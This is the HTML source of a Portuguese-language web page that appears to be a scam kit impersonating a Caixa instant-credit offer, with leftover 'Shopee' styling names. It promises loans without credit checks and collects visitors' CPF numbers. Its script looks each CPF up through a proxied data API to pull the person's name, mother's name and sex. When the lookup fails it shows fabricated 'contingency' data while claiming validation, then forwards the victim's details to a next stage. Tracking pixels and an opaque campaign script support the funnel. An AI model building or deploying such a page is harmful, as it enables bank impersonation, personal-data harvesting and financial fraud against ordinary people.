<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <script src="js/checker.js" data-campaign="49522d4b680124d18162f194871f79ae.e51e428698680cbec7bce2b2a9adcdd4b59ef85f80e80980b61959a5eb529aeda5c78b3d2d2e8bb67d909010cdc4016604088bd19e9c89af251ce0e1ad46a5ff954f463c905d"></script>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inicio</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">

  <!-- jQuery (necessário para $.ajax da API) -->
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            shopee: {
              light: "#ffdc00",
              DEFAULT: "#1a5e9c",
              dark: "#1a5e9c",
              laranja: "#f7941c",
            },
          },
        },
      },
    };
  </script>

  <style>
    body { font-family: "Poppins", sans-serif; background-color: #fff; }
    .shopee-gradient { background: linear-gradient(135deg, #FE2C55 0%, #FE2C55 100%); }
    .card { box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-radius: 16px; transition: all 0.3s ease; }
    .card:hover { box-shadow: 0 15px 30px rgba(0,0,0,0.1); transform: translateY(-2px); }
    .number-highlight { color: white; -webkit-background-clip: text; font-weight: 700; }
    .btn-shine { position: relative; overflow: hidden; }
    .btn-shine:after {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to right,
        rgba(255, 255, 255, 0) 0%,
        rgba(255, 255, 255, 0.3) 50%,
        rgba(255, 255, 255, 0) 100%
      );
      transform: rotate(30deg);
      animation: shine 4s infinite;
    }
    @keyframes shine {
      0% { left: -100%; opacity: 0; }
      10% { left: 100%; opacity: 0.6; }
      100% { left: 100%; opacity: 0; }
    }
    .floating { animation: float 3s ease-in-out infinite; }
    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-10px); }
      100% { transform: translateY(0px); }
    }

    .icon-circle {
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
    }

    .card-image {
      position: absolute;
      right: 5px;
      top: 35%;
      transform: translateY(-50%);
      z-index: 1;
      width: 150px;
    }
    @media (max-width: 380px) {
      .card-image { top: 30%; right: 0; width: 130px; }
    }

    .carousel { position: relative; overflow: hidden; width: 100%; border-radius: 12px; }
    .carousel-inner { display: flex; transition: transform 0.5s ease; height: 100%; }
    .carousel-item { width: 100%; flex-shrink: 0; }
    .carousel-item.active { display: block; }
    .carousel-item:not(.active) { display: none; }

    .carousel-img-container {
      background-color: #F8F8F8;
      border-radius: 16px;
      padding: 20px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
      margin-bottom: 20px;
      height: 300px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .carousel-img {
      max-width: 100%;
      max-height: 260px;
      object-fit: contain;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
    }

    .carousel-controls {
      position: relative;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 15px 0;
    }

    .step-number {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      border: 2px solid #F8F8F8;
      color: #000;
      background-color: #F8F8F8;
      transition: all 0.3s ease;
      cursor: pointer;
      z-index: 2;
    }
    .step-number.active {
      border-color: #fff;
      background-color: #1a5e9c;
      color: white;
    }
    .step-number.completed {
      border-color: #faea0d;
      background-color: #f7941c;
      color: white;
    }

    .step-line { flex: 1; height: 3px; background-color: #ddd; position: relative; }
    .step-line.active { background-color: #f7941c; }

    .carousel-indicators { display: flex; justify-content: center; margin-top: 15px; }
    .carousel-indicator {
      width: 10px; height: 10px; border-radius: 50%;
      background-color: #F8F8F8; margin: 0 5px; cursor: pointer;
    }
    .carousel-indicator.active { background-color: #1a5e9c; transform: scale(1.3); }

    .carousel-arrow {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background-color: #F8F8F8;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      z-index: 10;
    }
    .carousel-arrow.prev { left: 10px; }
    .carousel-arrow.next { right: 10px; }

    .page-transition { transition: opacity 0.4s ease, transform 0.4s ease; }
    .fade-out { opacity: 0; transform: translateY(20px); }
    .fade-in { opacity: 1; transform: translateY(0); }

    .pulse-yellow {
      position: relative;
      z-index: 1;
      color:#FE2C55;
      animation: pulse-yellow 1.5s infinite;
    }
    @keyframes pulse-yellow {
      0% { box-shadow: 0 0 0 0 rgba(250, 234, 13, 0.7); }
      70% { box-shadow: 0 0 0 15px rgba(250, 234, 13, 0); }
      100% { box-shadow: 0 0 0 0 rgba(250, 234, 13, 0); }
    }

    /* Toast Notification */
    #notification {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      top: 18px;
      z-index: 9999;
      opacity: 0;
      pointer-events: none;
      transition: opacity .25s ease, transform .25s ease;
    }
    #notification.show {
      opacity: 1;
      pointer-events: auto;
      transform: translateX(-50%) translateY(0);
    }
    #notification.hide {
      opacity: 0;
      pointer-events: none;
      transform: translateX(-50%) translateY(-10px);
    }
  </style>
</head>

<body class="bg-[#f1f1f1]">

  <!-- Toast Notification (injetado) -->
  <div id="notification">
    <div class="bg-black text-white px-4 py-3 rounded-xl shadow-lg flex items-center gap-2">
      <i class="fas fa-exclamation-circle"></i>
      <span id="notification-message" class="text-sm"></span>
    </div>
  </div>

  <script>
    window.pixelId = "692cedccf1d8644d9b7bb3bc";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>

  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-xcod-sck
    data-utmify-prevent-subids
    async
    defer
  ></script>

  <script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>

  <!-- Página principal -->
  <div id="mainPage" class="max-w-md mx-auto min-h-screen flex flex-col relative page-transition">
    <!-- Header with Brand -->
    <div class="flex items-center justify-between p-4 bg-white">
      <a href="#" class="text-shopee text-2xl"><i class="fas fa-arrow-left"></i></a>
      <div class="flex items-center">
        <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-11">
        <span class="ml-2 text-xl font-bold text-shopee"></span>
      </div>
      <div class="w-6"></div>
    </div>

    <!-- Hero Section -->
    <div class="text-white rounded-b-3xl relative overflow-hidden" style="min-height: 280px">
      <img src="images/bannercaixa1.png" class="w-full absolute" alt="">
    </div>

    <!-- Card de vantagens com sobreposição -->
    <div class="px-4" style="margin-top: -40px; position: relative; z-index: 10">
      <div class="bg-[#F8F8F8] card p-6">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
          Vantagens exclusivas
        </h2>

        <div class="space-y-5">
          <div class="flex items-center bg-gray-50 p-4 rounded-xl">
            <div class="bg-shopee text-white icon-circle mr-4">
              <i class="fas fa-bolt text-lg"></i>
            </div>
            <div>
              <h3 class="font-medium text-gray-800">Dinheiro na hora</h3>
              <p class="text-sm text-gray-600">
                Direto em sua conta Caixa
              </p>
            </div>
          </div>

          <div class="flex items-center bg-gray-50 p-4 rounded-xl">
            <div class="bg-yellow-500 text-white icon-circle mr-4">
              <i class="fas fa-shield-alt text-lg"></i>
            </div>
            <div>
              <h3 class="font-medium text-gray-800">Sem burocracia</h3>
              <p class="text-sm text-gray-600">Sem consulta ao SPC/Serasa</p>
            </div>
          </div>

          <div class="flex items-center bg-gray-50 p-4 rounded-xl">
            <div class="bg-teal-500 text-white icon-circle mr-4">
              <i class="fab fa-pix text-lg"></i>
            </div>
            <div>
              <h3 class="font-medium text-gray-800">Pague com PIX</h3>
              <p class="text-sm text-gray-600">Parcele em até 12 vezes</p>
            </div>
          </div>
        </div>

        <!-- Botão principal -->
        <button id="btnAtivar" class="pulse-yellow w-full text-white bg-shopee-laranja hover:bg-shopee-laranja text-lg font-bold py-4 rounded-xl mt-6 btn-shine">
          Ativar meu crédito agora
        </button>

        <!-- Input CPF (oculto inicialmente) -->
        <div id="cpfForm" class="mt-6 hidden">
          <p class="text-gray-700 mb-3">Digite seu CPF para continuar:</p>
          <div class="flex">
            <input type="text" id="cpfInput" placeholder="000.000.000-00" class="flex-1 border border-gray-300 rounded-l-xl p-3 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
            <button id="btnContinuar" class="bg-shopee text-white px-4 py-3 rounded-r-xl">
              Continuar
            </button>
          </div>
        </div>

        <!-- Confiança -->
        <div class="flex items-center justify-center mt-5 border-t pt-4 text-gray-600">
          <i class="fas fa-lock mr-2 text-black"></i>
          <span class="text-sm text-black">Seus dados estão <span class="font-semibold">protegidos</span> e
            <span class="font-semibold">seguros</span></span>
        </div>
      </div>
    </div>

    <!-- Como Aplicar (Carrossel) -->
    <div class="px-4 mt-6">
      <div class="bg-white card p-5">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
          Como Aplicar?
        </h2>

        <!-- Indicadores de etapas (números) -->
        <div class="carousel-controls">
          <div class="step-number active" id="step1" data-step="0">1</div>
          <div class="step-line" id="line1"></div>
          <div class="step-number" id="step2" data-step="1">2</div>
          <div class="step-line" id="line2"></div>
          <div class="step-number" id="step3" data-step="2">3</div>
        </div>

        <!-- Carrossel -->
        <div id="carousel" class="carousel">
          <!-- Botões de navegação -->
          <div id="prev-btn" class="carousel-arrow prev">
            <i class="fas fa-chevron-left text-shopee"></i>
          </div>
          <div id="next-btn" class="carousel-arrow next">
            <i class="fas fa-chevron-right text-shopee"></i>
          </div>

          <!-- Slides -->
          <div class="carousel-item active">
            <div class="carousel-img-container">
              <img src="images/1.jpeg" alt="Etapa 1" class="carousel-img">
            </div>
            <p class="text-center text-gray-800 font-medium">
              <span class="font-bold">1.</span> Tenha em mãos seu CPF e
              preencha seus dados para ver a proposta
            </p>
          </div>

          <div class="carousel-item">
            <div class="carousel-img-container">
              <img src="images/2.jpeg" alt="Etapa 2" class="carousel-img">
            </div>
            <p class="text-center text-gray-800 font-medium">
              <span class="font-bold">2.</span> Escolha o valor e o número de
              parcelas
            </p>
          </div>

          <div class="carousel-item">
            <div class="carousel-img-container">
              <img src="images/3.jpeg" alt="Etapa 3" class="carousel-img">
            </div>
            <p class="text-center text-gray-800 font-medium">
              <span class="font-bold">3.</span> Pronto! Se aprovado, o
              dinheiro cairá imediatamente em sua conta Caixa.
            </p>
          </div>
        </div>

        <!-- Indicadores do carrossel -->
        <div class="carousel-indicators">
          <div class="carousel-indicator active" data-index="0"></div>
          <div class="carousel-indicator" data-index="1"></div>
          <div class="carousel-indicator" data-index="2"></div>
        </div>
      </div>
    </div>

    <!-- Estatísticas de confiança -->
    <div class="px-4 mt-5">
      <div class="bg-shopee-dark card p-5 flex justify-between">
        <div class="text-center">
          <p class="number-highlight text-2xl font-bold">+1.2M</p>
          <p class="text-xs text-shopee-light">Clientes</p>
        </div>
        <div class="text-center">
          <p class="number-highlight text-2xl font-bold">4.9/5</p>
          <p class="text-xs text-shopee-light">Avaliação</p>
        </div>
        <div class="text-center">
          <p class="number-highlight text-2xl font-bold">3 min</p>
          <p class="text-xs text-shopee-light">Aprovação</p>
        </div>
      </div>
    </div>

    <!-- Simulador -->
    <div class="px-4 mt-5">
      <button id="btnSimular" class="bg-white card p-4 flex items-center justify-between w-full text-left">
        <div class="flex items-center">
          <div class="bg-gray-100 icon-circle mr-3">
            <i class="fas fa-calculator text-shopee"></i>
          </div>
          <div>
            <p class="font-medium text-gray-800">Simular Empréstimo</p>
            <p class="text-xs text-gray-600">
              Veja opções personalizadas para você
            </p>
          </div>
        </div>
        <i class="fas fa-chevron-right text-shopee"></i>
      </button>
    </div>

    <!-- Depoimentos -->
    <div class="px-4 mt-5 mb-10">
      <div class="bg-white card p-4">
        <div class="flex items-center mb-3">
          <div class="bg-shopee-dark bg-opacity-20 rounded-full p-2">
            <i class="fas fa-quote-right text-shopee"></i>
          </div>
          <p class="ml-2 font-medium text-gray-800">
            O que dizem nossos clientes
          </p>
        </div>

        <div class="border-l-4 border-shopee-light pl-3 py-1">
          <p class="text-sm text-gray-600 italic">
            "Processo super rápido, o dinheiro caiu na minha conta em menos de
            24h! Recomendo!"
          </p>
          <div class="flex items-center mt-1">
            <p class="text-xs font-medium text-gray-800">Mariana S.</p>
            <div class="flex ml-2">
              <i class="fas fa-star text-yellow-400 text-xs"></i>
              <i class="fas fa-star text-yellow-400 text-xs"></i>
              <i class="fas fa-star text-yellow-400 text-xs"></i>
              <i class="fas fa-star text-yellow-400 text-xs"></i>
              <i class="fas fa-star text-yellow-400 text-xs"></i>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Página de CPF (inicialmente oculta) -->
  <div id="cpfPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition opacity-0 hidden">
    <!-- Header com voltar -->
    <div class="flex items-center p-4 border-b">
      <button id="btnVoltar" class="text-shopee text-2xl mr-3">
        <i class="fas fa-arrow-left"></i>
      </button>
      <div class="flex items-center">
        <img src="images/logocaixa2.png" alt="Shopee Logo" class="h-11">
        <span class="ml-2 text-xl font-bold text-shopee"></span>
      </div>
    </div>

    <!-- Conteúdo da página de CPF -->
    <div class="flex-1 p-6 flex flex-col">
      <div class="mb-8">
        <h1 class="text-2xl font-bold text-gray-800 mb-2">
          Pré-análise de crédito
        </h1>
        <p class="text-gray-600">
          Para prosseguir com a análise do seu crédito, precisamos verificar
          seus dados. Esta consulta é rápida e não afeta seu score de crédito.
        </p>
      </div>

      <div class="bg-blue-50 p-4 rounded-xl mb-8">
        <div class="flex items-center">
          <div class="bg-blue-100 icon-circle mr-3 flex-shrink-0">
            <i class="fas fa-info-circle text-blue-600"></i>
          </div>
          <p class="text-sm text-blue-800">
            Seus dados são protegidos por criptografia e nunca serão
            compartilhados com terceiros.
          </p>
        </div>
      </div>

      <div class="mb-4">
        <label for="cpfInputPage" class="block text-gray-700 font-medium mb-2">CPF:</label>
        <input type="text" id="cpfInputPage" placeholder="000.000.000-00" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent text-lg">
        <p class="text-sm text-gray-500 mt-1">
          Digite apenas os números do seu CPF
        </p>
      </div>

      <div class="flex items-center mb-6">
        <input type="checkbox" id="termsCheck" class="mr-2 h-5 w-5 text-shopee">
        <label for="termsCheck" class="text-sm text-gray-700">Concordo com os
          <a href="#" class="text-shopee font-medium">Termos de Uso</a> e
          <a href="#" class="text-shopee font-medium">Política de Privacidade</a></label>
      </div>

      <button id="btnAnalisar" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl mt-auto btn-shine">
        Solicitar análise
      </button>

      <!-- Seção para exibir os resultados da consulta (inicialmente oculta) -->
      <div id="consultaResultado" class="mt-6 hidden">
        <div class="bg-gray-50 p-4 rounded-xl">
          <h3 class="text-lg font-bold text-gray-800 mb-3">
            Confirme seus dados
          </h3>

          <!-- Carregando -->
          <div id="loadingInfo" class="flex flex-col items-center py-4">
            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-shopee mb-3"></div>
            <p class="text-gray-600">Consultando seus dados...</p>
          </div>

          <!-- Informações do usuário -->
          <div id="userInfo" class="hidden">
            <div class="space-y-3">
              <div class="flex justify-between border-b pb-2">
                <span class="text-gray-600">Nome completo:</span>
                <span id="nomeUsuario" class="font-semibold text-gray-800"></span>
              </div>

              <div class="flex justify-between border-b pb-2">
                <span class="text-gray-600">CPF:</span>
                <span id="cpfUsuario" class="font-semibold text-gray-800"></span>
              </div>

              <div class="flex justify-between border-b pb-2">
                <span class="text-gray-600">Sexo:</span>
                <span id="sexoUsuario" class="font-semibold text-gray-800"></span>
              </div>

              <div class="flex justify-between pb-2">
                <span class="text-gray-600">Nome da mãe:</span>
                <span id="nomeMae" class="font-semibold text-gray-800"></span>
              </div>
            </div>

            <div class="mt-6 flex flex-col space-y-3">
              <p class="text-sm text-gray-700">Estes dados estão corretos?</p>
              <button id="btnConfirmar" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white font-bold py-3 rounded-xl">
                Sim, continuar
              </button>
              <button id="btnCorrigir" class="w-full bg-white border border-shopee text-shopee font-bold py-3 rounded-xl">
                Não, desejo corrigir
              </button>
            </div>
          </div>

          <!-- Mensagem de erro -->
          <div id="errorInfo" class="hidden">
            <div class="bg-red-50 p-4 rounded-lg flex items-start">
              <div class="text-red-500 mr-3 mt-1">
                <i class="fas fa-exclamation-circle text-xl"></i>
              </div>
              <div>
                <h4 class="font-medium text-red-800">
                  Não foi possível consultar seus dados
                </h4>
                <p id="errorMessage" class="text-sm text-red-600 mt-1">
                  Verifique seu CPF e tente novamente.
                </p>
              </div>
            </div>
            <button id="btnTentarNovamente" class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white font-bold py-3 rounded-xl mt-4">
              Tentar novamente
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Carregar o script de manipulação de páginas -->
  <script src="js/page-handler3.js"></script>

  <!-- Script para preencher o CPF do localStorage (mantido) -->
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const cpfSalvo = localStorage.getItem("cpf");
      const cpfInputPage = document.getElementById("cpfInputPage");

      if (cpfSalvo && cpfInputPage) {
        let cpfFormatado = cpfSalvo;
        if (cpfSalvo.length === 11) {
          cpfFormatado = cpfSalvo.replace(
            /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
            "$1.$2.$3-$4"
          );
        }
        cpfInputPage.value = cpfFormatado;
        console.log("CPF preenchido automaticamente do localStorage");
      }
    });
  </script>

  <!-- =========================
       API CPF (ADAPTADA)
  ========================== -->
  <script>
    function showNotification(message) {
      const notification = document.getElementById('notification');
      const notificationMessage = document.getElementById('notification-message');

      notification.classList.remove('show', 'hide');
      notificationMessage.textContent = message;
      notification.classList.add('show');

      setTimeout(() => {
        notification.classList.add('hide');
        setTimeout(() => {
          notification.classList.remove('show', 'hide');
        }, 300);
      }, 4000);
    }

    function formatCpf(value) {
      let v = (value || "").replace(/\D/g, "");
      if (v.length > 0) v = v.replace(/^(\d{3})(\d)/g, "$1.$2");
      if (v.length > 3) v = v.replace(/^(\d{3})\.(\d{3})(\d)/g, "$1.$2.$3");
      if (v.length > 6) v = v.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, "$1.$2.$3-$4");
      return v.substring(0, 14);
    }

    function applyCpfMask(inputEl) {
      if (!inputEl) return;
      inputEl.addEventListener("input", function (e) {
        const formatted = formatCpf(e.target.value);
        e.target.value = formatted;

        const cpfRaw = formatted.replace(/\D/g, "");
        if (cpfRaw.length === 11) {
          localStorage.setItem("cpfUsuario", cpfRaw);
          localStorage.setItem("cpf", cpfRaw);
        }

        e.target.selectionStart = e.target.value.length;
        e.target.selectionEnd = e.target.value.length;
      });
    }

    function setLoadingUI(isLoading) {
      const btn = document.getElementById("btnAnalisar");
      if (!btn) return;

      if (isLoading) {
        btn.disabled = true;
        btn.innerHTML =
          '<div class="flex items-center justify-center gap-2">' +
          '<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>' +
          "Consultando..." +
          "</div>";
      } else {
        btn.disabled = false;
        btn.textContent = "Solicitar análise";
      }
    }

    function showResultSection() {
      const box = document.getElementById("consultaResultado");
      const loading = document.getElementById("loadingInfo");
      const userInfo = document.getElementById("userInfo");
      const errorInfo = document.getElementById("errorInfo");

      box.classList.remove("hidden");
      loading.classList.remove("hidden");
      userInfo.classList.add("hidden");
      errorInfo.classList.add("hidden");
    }

    function showUserInfo(dadosUsuario, cpfRaw) {
      const loading = document.getElementById("loadingInfo");
      const userInfo = document.getElementById("userInfo");
      const errorInfo = document.getElementById("errorInfo");

      loading.classList.add("hidden");
      errorInfo.classList.add("hidden");
      userInfo.classList.remove("hidden");

      document.getElementById("nomeUsuario").textContent = dadosUsuario.NOME || "";
      document.getElementById("cpfUsuario").textContent = (cpfRaw || "").replace(
        /(\d{3})(\d{3})(\d{3})(\d{2})/,
        "$1.$2.$3-$4"
      );
      document.getElementById("sexoUsuario").textContent = dadosUsuario.SEXO || "";
      document.getElementById("nomeMae").textContent = dadosUsuario.MAE || "";
    }

    function showError(message) {
      const loading = document.getElementById("loadingInfo");
      const userInfo = document.getElementById("userInfo");
      const errorInfo = document.getElementById("errorInfo");
      const errorMessage = document.getElementById("errorMessage");

      loading.classList.add("hidden");
      userInfo.classList.add("hidden");
      errorInfo.classList.remove("hidden");
      if (errorMessage) errorMessage.textContent = message || "Verifique seu CPF e tente novamente.";
    }

    function getUrlParams() {
      const params = {};
      const urlParams = new URLSearchParams(window.location.search);
      for (const [key, value] of urlParams) params[key] = value;
      return params;
    }

    document.addEventListener("DOMContentLoaded", function () {
      // máscara nos dois inputs
      applyCpfMask(document.getElementById("cpfInput"));
      applyCpfMask(document.getElementById("cpfInputPage"));

      // Botão analisar
      const btnAnalisar = document.getElementById("btnAnalisar");
      btnAnalisar.addEventListener("click", function () {
        const terms = document.getElementById("termsCheck");
        if (terms && !terms.checked) {
          showNotification("Você precisa aceitar os termos para continuar.");
          return;
        }

        const cpfRaw = (document.getElementById("cpfInputPage").value || "").replace(/\D/g, "");
        if (cpfRaw.length !== 11) {
          showNotification("Por favor, insira um CPF válido");
          return;
        }

        // salva cpf em 2 chaves (compat)
        localStorage.setItem("cpfUsuario", cpfRaw);
        localStorage.setItem("cpf", cpfRaw);

        showResultSection();
        setLoadingUI(true);

        $.ajax({
          url: `https://corsproxy.io/?https://api.cpf-brasil.org/cpf/${cpfRaw}`,
          method: "GET",
          dataType: "json",
          headers: {
            "X-API-Key": "<API_KEY>" // <<< TROQUE AQUI
          },
          success: function (response) {
            const data = response && response.data ? response.data : null;

            if (!data || !data.NOME) {
              setLoadingUI(false);
              showError("Dados inválidos retornados pela consulta. Tente novamente.");
              return;
            }

            const dadosUsuario = {
              NOME: data.NOME,
              MAE: data.NOME_MAE || "",
              SEXO: data.SEXO || "",
              NASCIMENTO: data.NASC || ""
            };

            localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));

            const userData = { nome: data.NOME, cpf: cpfRaw };
            localStorage.setItem("userData", JSON.stringify(userData));

            setLoadingUI(false);
            showUserInfo(dadosUsuario, cpfRaw);
          },
          error: function (xhr, status, error) {
            setLoadingUI(false);

            if (xhr && xhr.status === 404) {
              showNotification("CPF não encontrado na base de dados");
              showError("CPF não encontrado. Verifique e tente novamente.");
            } else if (xhr && xhr.status === 401) {
              showNotification("Erro de autenticação");
              showError("Falha de autenticação na consulta.");
            } else if (xhr && xhr.status === 429) {
              showNotification("Muitas requisições. Aguarde um momento.");
              showError("Muitas requisições. Aguarde e tente novamente.");
            } else {
              // fallback com simulado (igual ao seu script)
              console.log("Erro na API, fallback simulado:", status, error);

              const dadosUsuario = {
                NOME: "GHERSON DYWYNO ESPHYNDOLA",
                MAE: "MARIA HELENA",
                SEXO: "MASCULINO",
                NASCIMENTO: "31/03/1966"
              };

              localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
              localStorage.setItem("userData", JSON.stringify({ nome: dadosUsuario.NOME, cpf: cpfRaw }));

              showNotification("Instabilidade na consulta. Validamos com dados de contingência.");
              showUserInfo(dadosUsuario, cpfRaw);
            }
          }
        });
      });

      // Tentar novamente
      const btnTentar = document.getElementById("btnTentarNovamente");
      if (btnTentar) {
        btnTentar.addEventListener("click", function () {
          document.getElementById("btnAnalisar").click();
        });
      }

      // Corrigir
      const btnCorrigir = document.getElementById("btnCorrigir");
      if (btnCorrigir) {
        btnCorrigir.addEventListener("click", function () {
          document.getElementById("consultaResultado").classList.add("hidden");
          document.getElementById("userInfo").classList.add("hidden");
          document.getElementById("errorInfo").classList.add("hidden");
          document.getElementById("loadingInfo").classList.remove("hidden");
          document.getElementById("cpfInputPage").focus();
        });
      }

      // Confirmar -> Spinner 2.5s + redirect mantendo UTMs + name
      const btnConfirmar = document.getElementById("btnConfirmar");
      if (btnConfirmar) {
        btnConfirmar.addEventListener("click", function () {
          const button = this;
          const params = getUrlParams();

          try {
            const dadosUsuario = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
            if (dadosUsuario && dadosUsuario.NOME) params.name = dadosUsuario.NOME;
          } catch(e) {}

          button.disabled = true;
          button.innerHTML =
            '<div class="flex items-center justify-center gap-2">' +
            '<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>' +
            "Carregando..." +
            "</div>";

          setTimeout(() => {
            const url = new URL("../3/index.html", window.location.href);
            Object.keys(params).forEach(key => url.searchParams.append(key, params[key]));
            window.location.href = url.toString();
          }, 2500);
        });
      }
    });
  </script>

  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
</body>
</html>
